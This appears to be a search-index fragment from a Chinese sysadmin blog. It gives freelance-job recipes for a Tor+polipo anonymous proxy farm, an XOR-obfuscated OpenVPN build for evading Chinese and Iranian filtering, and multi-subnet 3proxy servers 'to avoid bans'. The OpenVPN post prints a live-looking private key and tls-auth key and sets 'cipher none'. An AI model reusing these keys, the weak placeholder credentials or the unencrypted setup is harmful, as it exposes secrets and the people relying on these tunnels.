authenticated (if any), else \u0026lsquo;-\u0026rsquo;\u003c/li\u003e\n\u003cli\u003e%U - Requested URL path\u003c/li\u003e\n\u003cli\u003e%v - Local server name\u003c/li\u003e\n\u003cli\u003e%D - Time taken to process the request, in millis\u003c/li\u003e\n\u003cli\u003e%T - Time taken to process the request, in seconds\u003c/li\u003e\n\u003cli\u003e%I - Current request thread name (can compare later with stacktraces)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e另外，还可以将request请求的查询参数、session会话变量值、cookie值或HTTP请求/响应头内容的变量值等内容写入到日志文件。\u003c/p\u003e","title":"Tomcat推荐的日志记录格式"},{"content":"Freelancer上有个proxy setup的任务：\nProject Description Hi, I would like to create a new VPS proxy server with multiple IPs on the same VPS. Are you able to that? What OS do you prefer? - I have 10 ips.\r- I want them to be as much anonymous as you can.\r- I would have an Username and Password as auth, but if needed the possibility to have an IP authentication too.\rMy budget is: ~20$ Thank you in advance. 说老实话，10个IP没必要，一个IP足够了，用Tor+polipo即可。\nTor的部分，用完全命令行加参数启动：\n$ mkdir -p /tmp/tor10001/data $ /usr/bin/tor SOCKSPort 10001 CONTROLPort 20001 DATADirectory /tmp/tor10001/data Polipo的部分，也完全用命令行启动：\n$ polipo socksParentProxy=\u0026#34;127.0.0.1:10001\u0026#34; proxyPort=30001 proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; 组合起来，弄成一个脚本：\n$ mkdir -p /tmp/tor10002/data $ nohup /usr/bin/tor SOCKSPort 10002 CONTROLPort 20002 DATADirectory /tmp/tor10002/data \u0026amp; $ nohup polipo socksParentProxy=\u0026#34;127.0.0.1:10002\u0026#34; proxyPort=30002 proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; \u0026amp; 开100个Tor+Polipo：\n#!/bin/bash a=10001 b=20001 c=30001 n=10100 echo \u0026#34;Start multiple Tors+polipo\u0026#34; echo \u0026#34;Begin port \u0026#34; $a echo \u0026#34;End port \u0026#34; $n while [ $a -le $n ] do echo \u0026#34;Start Tor on port\u0026#34; $a mkdir -p /tmp/tor$a/data nohup /usr/bin/tor SOCKSPort $a CONTROLPort $b DATADirectory /tmp/tor$a/data \u0026amp; echo \u0026#34;Start Polipo on port\u0026#34; $c nohup polipo socksParentProxy=\u0026#34;127.0.0.1:$a\u0026#34; proxyPort=$c proxyAddress=\u0026#34;0.0.0.0\u0026#34; authCredentials=\u0026#34;username:password\u0026#34; \u0026amp; a=$(($a + 1)) b=$(($b + 1)) c=$(($c + 1)) done 通杀Tor+Polipo的脚本\n#!/bin/bash ps aux | grep tor | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 ps aux | grep polipo | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 ","permalink":"https://rendoumi.com/posts/20240124-freelancer_1/","summary":"\u003cp\u003eFreelancer上有个proxy setup的任务：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eProject Description  \r\nHi, I would like to create a new VPS proxy server with multiple IPs on the same VPS.  \r\nAre you able to that?  \r\nWhat OS do you prefer?  \r\n- I have 10 ips.\r\n- I want them to be as much anonymous as you can.\r\n- I would have an Username and Password as auth, but if needed the possibility to have an IP authentication too.\r\nMy budget is: ~20$  \r\nThank you in advance.  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e说老实话，10个IP没必要，一个IP足够了，用Tor+polipo即可。\u003c/p\u003e","title":"Freelancer的任务之一：多IP多重匿名代理加认证"},{"content":"这个很奇怪撒，仔细查了下，原作者是这么说的：\nI have created a patch which introduces some forms of scrambling to the packet payload of any OpenVPN connection. I have been successfully using the patch with Iranian and Chinese users for some time now. 看来伊朗也比较糟糕啊。\n无语，鉴于在森华易腾无法建openvpn，不知道是直接封了1194的udp端口，还是从协议上封掉了openvpn，总之，都很shit。\n简单说就是对openvpn协议进行了混淆，多了一个配置项：\nscramble 参数 scramble reverse #对传输的数据进行反转，通常这一句就已经可以绕过China和Iran的检测机制了 scramble xorptrpos #对传输的package中的有效数据进行xor运算 scramble obfuscate password #更强烈的加密。反转+xor+密码三种方式全用上. \u0026#34;password\u0026#34; 是你设定的密码 用上这个配置项后，建议设置cipher none, 因为如此这般以后，没有必要再制定cipher方式了。另外，用cipher会消耗cpu，而采用scramble消耗cpu的程度比cipher低。 搭一个试试看 这里采用的是openvpn 2.4.4版本和相应的patch\n下载：\n2.4.4.zip master.zip #centos yum -y install unzip yum -y groupinstall \u0026#34;development tools\u0026#34; #ubuntu apt update apt install build-essential unzip -x 2.4.4.zip unzip -x master.zip 应用补丁：\ncd openvpn-release-2.4/ git apply ../openvpn_xorpatch-master/openvpn_xor.patch 安装依赖包并编译：\n#cetnos yum install -y openssl-devel lz4-devel net-tools lzo-devel pam-devel #ubuntu apt install autoreconf liblzo2-dev libpam0g-dev autoreconf -i -v -f ./configure --prefix=/export/servers/openvpn make make install 安装easy-rsa-3.0，不得不击节叫好啊，easy-rsa 3.0比2.0进化多了，就一个可执行文件，也轻省多了：\nwget http://img.rendoumi.com/soft/vpn/easy-rsa.zip unzip -x easy-rsa.zip 建立openvpn配置文件夹\nmkdir -p /etc/openvpn/conf cp -r easy-rsa-master/easyrsa3/* /etc/openvpn 看看新版easy-rsa-3.0都有什么命令\ncd /etc/openvpn ./easyrsa Easy-RSA 3 usage and overview USAGE: easyrsa [options] COMMAND [command-options] A list of commands is shown below. To get detailed usage and help for a command, run: ./easyrsa help COMMAND For a listing of options that can be supplied before the command, use: ./easyrsa help options Here is the list of commands available with a short syntax reminder. Use the \u0026#39;help\u0026#39; command above to get full usage details. init-pki build-ca [ cmd-opts ] gen-dh gen-req \u0026lt;filename_base\u0026gt; [ cmd-opts ] sign-req \u0026lt;type\u0026gt; \u0026lt;filename_base\u0026gt; build-client-full \u0026lt;filename_base\u0026gt; [ cmd-opts ] build-server-full \u0026lt;filename_base\u0026gt; [ cmd-opts ] revoke \u0026lt;filename_base\u0026gt; gen-crl update-db show-req \u0026lt;filename_base\u0026gt; [ cmd-opts ] show-cert \u0026lt;filename_base\u0026gt; [ cmd-opts ] import-req \u0026lt;request_file_path\u0026gt; \u0026lt;short_basename\u0026gt; export-p7 \u0026lt;filename_base\u0026gt; [ cmd-opts ] export-p12 \u0026lt;filename_base\u0026gt; [ cmd-opts ] set-rsa-pass \u0026lt;filename_base\u0026gt; [ cmd-opts ] set-ec-pass \u0026lt;filename_base\u0026gt; [ cmd-opts ] DIRECTORY STATUS (commands would take effect on these locations) EASYRSA: . PKI: /etc/openvpn/pki 简单明了，一目了然，来吧，一气呵成\ncd /etc/openvpn ./easyrsa init-pki ./easyrsa --batch build-ca nopass ./easyrsa --batch build-server-full server nopass ./easyrsa --batch build-client-full client1 nopass ./easyrsa gen-dh 什么都不用管，就全弄好了，比起easy-rsa 2.0一堆脚本，修改vars，省事多了！！！\n准备server端的配置文件：\ncd /etc/openvpn/ cp pki/ca.crt pki/dh.pem pki/private/client1.key pki/private/server.key pki/issued/* /etc/openvpn/conf cd /etc/openvpn/conf /export/servers/openvpn/sbin/openvpn --genkey --secret ta.key 这样/etc/openvpn/conf下就会有7个文件\nca.crt server.key client1.key client1.crt dh.pem server.crt ta.key 准备个模板：\ncat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/openvpn/conf/server.conf port 1194 proto udp dev tun server 10.8.0.0 255.255.255.0 scramble obfuscate fuckfuckfuck ca /etc/openvpn/conf/ca.crt cert /etc/openvpn/conf/server.crt key /etc/openvpn/conf/server.key tls-auth /etc/openvpn/conf/ta.key 0 key-direction 0 dh /etc/openvpn/conf/dh.pem cipher none #push \u0026#34;route 172.16.0.0 255.255.0.0\u0026#34; client-to-client comp-lzo persist-key persist-tun user nobody group nobody ifconfig-pool-persist /etc/openvpn/conf/ipp.txt status /var/log/openvpn-status.log log /var/log/openvpn.log log-append /var/log/openvpn.log keepalive 5 30 verb 3 EOF 启动server端\n/export/servers/openvpn/sbin/openvpn --config /etc/openvpn/server.conf --daemon 准备客户端文件\ncat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/openvpn/conf/client1.ovpn client dev tun proto udp remote change_this_to_server_address 1194 scramble obfuscate fuckfuckfuck resolv-retry infinite nobind persist-key persist-tun user nobody group nogroup ca ca.crt cert client1.crt key client1.key tls-auth ta.key 1 remote-cert-tls server key-direction 1 cipher none comp-lzo keepalive 5 30 verb 3 EOF 合并出一个单独的客户端文件 注意merge.sh里面文件的配置：\nca=\u0026#34;ca.crt\u0026#34; cert=\u0026#34;client1.crt\u0026#34; key=\u0026#34;client1.key\u0026#34; tlsauth=\u0026#34;ta.key\u0026#34; ovpndest=\u0026#34;client1.ovpn\u0026#34; cd /etc/openvpn/conf wget http://img.rendoumi.com/soft/vpn/merge.sh chmod 755 merge.sh ./merge.sh 这样就会合并出一个client1.ovpn客户端连接文件来，全部合一，其实server.conf也可以把所有东西包括进去\nclient dev tun proto udp remote change_this_to_server_address 1194 scramble obfuscate fuckfuckfuck resolv-retry infinite nobind persist-key persist-tun remote-cert-tls server cipher none comp-lzo verb 3 key-direction 1 \u0026lt;ca\u0026gt; -----BEGIN CERTIFICATE----- MIIDKzCCAhOgAwIBAgIJAOG5arbs5t9RMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV BAMTCENoYW5nZU1lMB4XDTE4MDMyODAzNDkyMloXDTI4MDMyNTAzNDkyMlowEzER MA8GA1UEAxMIQ2hhbmdlTWUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB AQDMOUuQg49OstGbfPLjTgzwb5YBmBeVxyF3+5jmKbgPXujZ3dvdBwxaslVUwre6 XsMUBz3vbB7Kf1BBDHe2jt60p2x2O+ptTb3rRhTPLhdhd9C3HUhwkNYc7jv1+ua3 sUlwiYikltKhXGVU3e/XYB+Aiw63mem4ex5T4kJ/KIKoulGhUsaOl9JtPPKbeIlV BgUzBLHNt/9bY7r7m2Fh0VmbD5p5YMZEGrg+WX0qzT4wKD/734VdxuAoFwd7as6s CH73w0ykscV7evUJEaNu1keTqgqG5SuE3HzQ1cmWSSeF84gUes+l2JAivpQ/XTkF wdLnq2caXVTMDF8t/Y1e8JfVAgMBAAGjgYEwfzAdBgNVHQ4EFgQU+SKBqluAW6hQ p8y9Q22ZBhkTw5IwQwYDVR0jBDwwOoAU+SKBqluAW6hQp8y9Q22ZBhkTw5KhF6QV MBMxETAPBgNVBAMTCENoYW5nZU1lggkA4blqtuzm31EwDAYDVR0TBAUwAwEB/zAL BgNVHQ8EBAMCAQYwDQYJKoZIhvcNAQELBQADggEBAL9ZqyMSrrJ2ss/5pQhUBw71 nmjeT8DPg7Optiq02oAPdIo06WdJ77Y+mFypGKw8uUHp/h0mL5wBr6NBYbdw+5Lc vv4tCpOzzNW7PJngJWilIdvL1W+y3i3/AolSs7jAradaOQOpI23tOeQAQUmwchmt hvgKH8kyIWlOzxGIHdG9Spv8Oi1X6dwD0t4ddaNqcnCbyC2cBX4TvlXeVixMdBLY xq/5+G6dlJhaUzD4lG9Co7PTctwOFzKIP+mCrhLFCh7v5L6HCqL5ZLI7bWYTy0rm XURbleynyld95FKuul5YFRyb/j+I8iBd3Sw9TWhVuqKb4JX9n6zB1FxkNUX1r4g= -----END CERTIFICATE----- \u0026lt;/ca\u0026gt; \u0026lt;cert\u0026gt; -----BEGIN CERTIFICATE----- MIIDRTCCAi2gAwIBAgIRALV3i3gqfdbfWujom75JgiwwDQYJKoZIhvcNAQELBQAw EzERMA8GA1UEAxMIQ2hhbmdlTWUwHhcNMTgwMzI4MDg1NjQ5WhcNMjgwMzI1MDg1 NjQ5WjASMRAwDgYDVQQDEwdjbGllbnQxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A MIIBCgKCAQEAqXq+oaXFyp24OBuXrAPRxnyg4t7eKl7jh4EmL+T2xnQ5qZfwDBz/ 0mI6MDgqPFDC8DWeO3iJZlNlIBNrHpza2kj53Fw7UB1yyi9fArt3Luj2HdjqXyDw yLTX6dVV/m+dP7Jq1OnnpaG7gbkjKaaS8inc79v1ismJK9ZAwaiQobv1T3Th7eL+ nrKfjCJ/gevHfXocR7PuEe1CwyUEp124Z5fhq7S6JAgmt3WbiBVPIg5lp/pCyfbh K6z1Y5abPVCAJXTqgbaYBLIorO88wn5zn5D6ZFXDTdo3gJgQSlbax6AN5CqyK+Qi U2mF7Cf8+Ma+0eLbOFM62kulaqXX+uUojwIDAQABo4GUMIGRMAkGA1UdEwQCMAAw HQYDVR0OBBYEFJaAOw/CP8O/dnncm/VwlPow8kM9MEMGA1UdIwQ8MDqAFPkigapb gFuoUKfMvUNtmQYZE8OSoRekFTATMREwDwYDVQQDEwhDaGFuZ2VNZYIJAOG5arbs 5t9RMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQEAwIHgDANBgkqhkiG9w0B AQsFAAOCAQEAmU9Y+dP4PH0eh4KMNW0QhseN0t0CK1Nzyu3hNcuIntns3J3VpJ1u 1WKA16mnH8nLu2hNUKnWkOnuvPnwXIprWdg9Zvmct/QEtys4THnG3+5Ni7wVexhU lNU0qZcwGNwqQiZBrHcZZq6pAKtrAH0kD6/l5qCeScPrDIy6w3eFfGa/AJcEBNEN Wruj3hUQxRsv35XFfxEROaklfuLrfr0U1OlWDySSGMQafXjZCmLdxRb5IkI90255 t3yksT9Bj7v/2n++ttlQTH0FK5zY7Uz76A21idiRCw/aVeXvJkafYqi+o/9kkVJh w+Q9Lm+AKGkaaMgz0dt0cmVZgHsnyzOzhQ== -----END CERTIFICATE----- \u0026lt;/cert\u0026gt; \u0026lt;key\u0026gt; -----BEGIN PRIVATE KEY----- MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCper6hpcXKnbg4 G5esA9HGfKDi3t4qXuOHgSYv5PbGdDmpl/AMHP/SYjowOCo8UMLwNZ47eIlmU2Ug E2senNraSPncXDtQHXLKL18Cu3cu6PYd2OpfIPDItNfp1VX+b50/smrU6eelobuB uSMpppLyKdzv2/WKyYkr1kDBqJChu/VPdOHt4v6esp+MIn+B68d9ehxHs+4R7ULD JQSnXbhnl+GrtLokCCa3dZuIFU8iDmWn+kLJ9uErrPVjlps9UIAldOqBtpgEsiis 7zzCfnOfkPpkVcNN2jeAmBBKVtrHoA3kKrIr5CJTaYXsJ/z4xr7R4ts4UzraS6Vq pdf65SiPAgMBAAECggEAKwlSUzYHTfZTC1xmXXXy1RZcvH+fpt7FpGk1S0A3Mhnd cqV0fX73r3LmF8yLXRmdBuZ2sd9f9K4EpeqIbxOht4CEgmKhZSy1M4Zn+AemsjDS Hq4whcuVmUHi+iwEVEH/imdCHaLwAe1Z8g0TUsZL1lavFfGjHoUi4hDcDNFDOO5Z +gOL+ZLtAwCibcdTgdW7xXZMY6U4Mg4f7VggFqpuxe90ebaa1DHUYOm4XFQdrEOg KtC93wkFKuz9fXvyCyjk5t3oXO3EQvLSsm0W1LhBYkdZp8fUmkgh7Lz2J/h7/qK9 FYxbkvbFE7Zl1FE0g4kYNgMRq94Dy7IPhrbCXh1XUQKBgQDXYJt0KlfNdIQrZVsg kGkvE9eeEw3XhRCzsKIqnD3DkvkgowD6kpq9rU3tTg1x830QbfPu9L5cQEt5Hlsg zzCWKsjvC8Gnblz4ctvUvl+o9jbIKBf1aSykGGLZqB8rITd+gY8jcRDE637pxmKO HHhN0hjXyhSpjSCeWfvHHt4OdQKBgQDJcfq3nVmO6JBjn8Csywi9OHhodI4IKcLH EuEoJR0akv5l07UQGZXjkT60UUg5uAIU+z/Bk7UOErJckxvMCLzg9/O1ZRCEppdP GKMP4DM/xxdf37zEifBtFzBG9LCoIEJqRwzhaD7jyEg8jEv9G+ege/Bp5W9WDS2P 9bWWF3DCcwKBgHN+0t4QdtUuTlIXIC7uQfmE4nNaNGoGaVZyugOvlU9zWTUvNC8q vuBINymyWXNp5v8Qd2cEx7Agqlhg9u05LgzZFLdbzpVCkYiJz2jeTd4FaosbNP3d UJsOmLOvfEdcoK2uPFv9Hcj7oCssv10F112j9L6DF2F01LEV//ZfjyShAoGAEHjo hoEwZJYx0GOszrRfh5GJjwkQ4CwCCGNL1AuM4LJqaQsxwBpHfm9PEFGhNU8NpIeT BBI++OKggR9qY3nHcCH2ZLvZ6O7yan5aPx8XMbzm9WkHN48MAO+ne/XgSC8zHxum OvxaQCgNeB4EzLKucxoPY6lmPEQhmKb/7UEHcG8CgYEAxhtREMFAL0+uDAJ72WLx qCEM0x9zet5DOLOqxUSlBJILAwwcgGA1DXdjMej/BxZbIHgZANZ3Gj+k3D5m4GQl Pe3DtI3HBLbVH8DeyZC6fJxjaNi16/mbD6puRpPs+w0D2pQwJr6k2uR8+G883RW5 4vcpovBkutR5n1M09M3DyeU= -----END PRIVATE KEY----- \u0026lt;/key\u0026gt; \u0026lt;tls-auth\u0026gt; -----BEGIN OpenVPN Static key V1----- 79a3add18ba52b97045de864939a9a9e a0a07657bce8a0210c41b7d83d48ec48 81c89db3dbec8b4bfc13424d3813711d f34a4770ebeaf181eeffcd3f38cea425 78006c5b7506a5d9dcb0079daa3b3412 5434af9df560f3a0d29bc8b333479943 0f5839fee349f2079d03c9d31d6e2bf4 26a32180c8e4f6c1579acbfef7596335 a4147c64395ff77927ebe02f2a757d17 a2df3245670c1eff89f9e1025dbc4b07 8d3fcfaf4fbad44d9becf17f5d6d34ee 50d616fb58bc0e29da54a934353701a9 973df9b1f9041706642ff8ed00b24462 5cb52768dd5472093855d0e8fa5b8762 cca2aa48bda3d8964a19842fbf9d2081 ff0075295379f663129723ee9319a789 -----END OpenVPN Static key V1----- \u0026lt;/tls-auth\u0026gt; ok，把这个client1.ovpn拷贝出来，准备弄到windows上用\n在windows上下载原始的openvpn-gui:\nhttp://img.rendoumi.com/soft/vpn/openvpn-install-2.4.4-I601.exe 然后下载对应的openvpn主文件\nhttps://github.com/lawtancool/openvpn-windows-xor/releases 先安装好openvpn，然后到\nC:\\Program Files\\OpenVPN\\config 把client1.ovpn放进去\n然后以管理员身份启动桌面上的OpenVPN-GUI，右键点击连接就可以连上了。\n","permalink":"https://rendoumi.com/posts/20240124_freelancer_2/","summary":"\u003cp\u003e这个很奇怪撒，仔细查了下，原作者是这么说的：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eI have created a patch which introduces some forms of scrambling to the packet payload of any OpenVPN connection.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eI have been successfully using the patch with Iranian and Chinese users \u003cspan class=\"k\"\u003efor\u003c/span\u003e some \u003cspan class=\"nb\"\u003etime\u003c/span\u003e now.  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看来伊朗也比较糟糕啊。\u003c/p\u003e\n\u003cp\u003e无语，鉴于在森华易腾无法建openvpn，不知道是直接封了1194的udp端口，还是从协议上封掉了openvpn，总之，都很shit。\u003c/p\u003e\n\u003cp\u003e简单说就是对openvpn协议进行了混淆，多了一个配置项：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble 参数  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble reverse \u003cspan class=\"c1\"\u003e#对传输的数据进行反转，通常这一句就已经可以绕过China和Iran的检测机制了  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble xorptrpos \u003cspan class=\"c1\"\u003e#对传输的package中的有效数据进行xor运算  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escramble obfuscate password \u003cspan class=\"c1\"\u003e#更强烈的加密。反转+xor+密码三种方式全用上. \u0026#34;password\u0026#34; 是你设定的密码\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e用上这个配置项后，建议设置cipher none, 因为如此这般以后，没有必要再制定cipher方式了。另外，用cipher会消耗cpu，而采用scramble消耗cpu的程度比cipher低。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e搭一个试试看 这里采用的是openvpn 2.4.4版本和相应的patch\u003c/p\u003e\n\u003cp\u003e下载：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"2.4.4.zip\"\u003e2.4.4.zip\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"master.zip\"\u003emaster.zip\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#centos \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install unzip  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y groupinstall \u003cspan class=\"s2\"\u003e\u0026#34;development tools\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ubuntu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install build-essential\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip -x 2.4.4.zip  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip -x master.zip  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e应用补丁：\u003c/p\u003e","title":"Freelancer任务之二：建一个scramble obfuscated opevpn"},{"content":"任务的要求是：\n• Multiple subnets to avoid bans •I need the proxies to have the ability of User:Pass •Proxy needs to be Residential IPv6\n还给出了一个参考： https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/\n恩，比较有意思。按照他给的连接：\n第一步去 LowEndBox.com 或者 Webhostingtalk.com 去找一家口碑比较好，而且能提供附加ip的VPS供应商，通常附加一个IP是1$一个月。\n第二步买个VPS，配置是1G内存，1个内核，100M带宽，并且附加10个IP。\n这样的VPS一般是5$一个月，10$10个ip一个月，合计15$一个月，100元人民币，这样你就有11个IP可用了。\n按这个任务的要求，需要Multiple subnet，你就从这家供应商的不同地点多买几台，比如洛杉矶1台，德州1台，纽约1台，然后每台附加10个IP\n第三步就是安装Proxy软件了：\n下载3Proxy\nwget http://img.rendoumi.com/soft/3proxy/0.8.11.tar.gz tar zxvf 0.8.11.tar.gz 编译安装：\ncd 3proxy-0.8.11 sed -i \u0026#39;s/^prefix.*/prefix=\\/usr\\/local\\/3proxy/\u0026#39; Makefile.Linux sed -i \u0026#39;/DENY.*/a #define ANONYMOUS 1\u0026#39; src/proxy.h make -f Makefile.Linux make -f Makefile.Linux install 注意上面我是安装到了/usr/local/3proxy，大家可以根据需求修改。\n看看配置都是什么\ncat cfg/3proxy.cfg.sample |grep -v ^# | grep -v ^$ nserver 10.1.2.1 nserver 10.2.2.2 nscache 65536 timeouts 1 5 30 60 180 1800 15 60 users 3APA3A:CL:3apa3a \u0026#34;test:CR:$1$qwer$CHFTUFGqkjue9HyhcMHEe1\u0026#34; service log c:\\3proxy\\logs\\3proxy.log D logformat \u0026#34;- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34; archiver rar rar a -df -inul %A %F rotate 30 auth iponly external 10.1.1.1 internal 192.168.1.1 auth none dnspr auth strong deny * * 127.0.0.1,192.168.1.1 allow * * * 80-88,8080-8088 HTTP allow * * * 443,8443 HTTPS proxy -n auth none pop3p tcppm 25 mail.my.provider 25 auth strong flush allow 3APA3A,test maxconn 20 socks auth strong flush internal 127.0.0.1 allow 3APA3A 127.0.0.1 maxconn 3 admin 一堆的废物配置啊，统统去掉\ncat\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/usr/local/3proxy/bin/3proxy.conf daemon timeouts 1 5 30 60 180 1800 15 60 log /var/log/3proxy.log D logformat \u0026#34;- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34; rotate 30 users user:CL:pass auth strong allow user proxy -p3128 -a -i172.16.8.1 -e172.16.8.1 flush EOF 有用的就是下面5行 users 定义了一个用户user,明文密码，密码是pass auth 定义了需要认证 allow 定义了user用户可以访问 proxy -p端口 -a -i内网监听ip -e出口ip\nok了，然后启动：\ncd /usr/local/3proxy/bin ./3proxy 3proxy.conf 测试一下：\ncurl --proxy 172.16.8.1:3128 --proxy-user user:pass http://www.sina.com.cn -vvv|more 还有个需求，ipv6\n格式如下 proxy -6 -n -a -p\u0026lt;PORT1\u0026gt; -i\u0026lt;IPv4\u0026gt; -e\u0026lt;IPv6\u0026gt; proxy -6 -n -a -p\u0026lt;PORT2\u0026gt; -i\u0026lt;IPv4\u0026gt; -e\u0026lt;IPv6\u0026gt; ... 这么搞一下即可： proxy -6 -n -a -p3128 -i172.16.8.1 -e2a02:26f0:4000:17d::2adb ok，搞定。\n","permalink":"https://rendoumi.com/posts/20240124_freelancer_3/","summary":"\u003cp\u003e任务的要求是：\u003c/p\u003e\n\u003cp\u003e• Multiple subnets to avoid bans\n•I need the proxies to have the ability of User:Pass\n•Proxy needs to be Residential IPv6\u003c/p\u003e\n\u003cp\u003e还给出了一个参考：\n\u003ca href=\"https://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/\"\u003ehttps://www.blackhatworld.com/seo/never-buy-proxies-again-setup-your-own-proxy-server.872539/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e恩，比较有意思。按照他给的连接：\u003c/p\u003e\n\u003cp\u003e第一步去 LowEndBox.com 或者 Webhostingtalk.com 去找一家口碑比较好，而且能提供附加ip的VPS供应商，通常附加一个IP是1$一个月。\u003c/p\u003e\n\u003cp\u003e第二步买个VPS，配置是1G内存，1个内核，100M带宽，并且附加10个IP。\u003c/p\u003e\n\u003cp\u003e这样的VPS一般是5$一个月，10$10个ip一个月，合计15$一个月，100元人民币，这样你就有11个IP可用了。\u003c/p\u003e\n\u003cp\u003e按这个任务的要求，需要Multiple subnet，你就从这家供应商的不同地点多买几台，比如洛杉矶1台，德州1台，纽约1台，然后每台附加10个IP\u003c/p\u003e\n\u003cp\u003e第三步就是安装Proxy软件了：\u003c/p\u003e\n\u003cp\u003e下载3Proxy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://img.rendoumi.com/soft/3proxy/0.8.11.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf 0.8.11.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编译安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e 3proxy-0.8.11  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;s/^prefix.*/prefix=\\/usr\\/local\\/3proxy/\u0026#39;\u003c/span\u003e Makefile.Linux  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;/DENY.*/a #define ANONYMOUS 1\u0026#39;\u003c/span\u003e src/proxy.h  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake -f Makefile.Linux  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake -f Makefile.Linux install  